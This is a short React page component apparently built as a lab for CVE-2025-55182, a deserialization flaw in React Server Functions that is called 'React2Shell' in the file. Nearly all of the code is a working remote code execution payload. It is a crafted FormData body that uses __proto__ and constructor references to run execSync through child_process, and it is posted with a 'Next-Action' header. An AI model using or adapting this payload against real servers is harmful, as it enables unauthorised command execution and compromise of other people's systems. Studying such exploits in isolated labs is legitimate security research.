import { useState } from "react";

export default function Home() {
  const [output, setOutput] = useState("");

  const launchExploit = async () => {
    const crafted = {
      then: "$1:__proto__:then",
      status: "resolved_model",
      reason: -1,
      value: '{"then":"$B0"}',
      _response: {
        _prefix: "process.mainModule.require('child_process').execSync('id').toString();",
        _formData: { get: "$1:constructor:constructor" }
      }
    };

    const form = new FormData();
    form.append("0", JSON.stringify(crafted));
    form.append("1", '"$@0"');

    const res = await fetch("/api/rce", {
      method: "POST",
      headers: { "Next-Action": "x" },
      body: form
    });

    const txt = await res.text();
    setOutput(txt);
  };

  return (
    <div style={{ padding: 40 }}>
      <h1>CVE-2025-55182 LAB — React RSC → RCE</h1>
      <p>This is a research environment. Exploit React Server Function deserialization.</p>

      <button onClick={launchExploit}>
        Trigger React2Shell Exploit
      </button>

      <pre style={{ marginTop: 20, background: "#111", color: "#0f0", padding: 20 }}>
        {output}
      </pre>
    </div>
  );
}
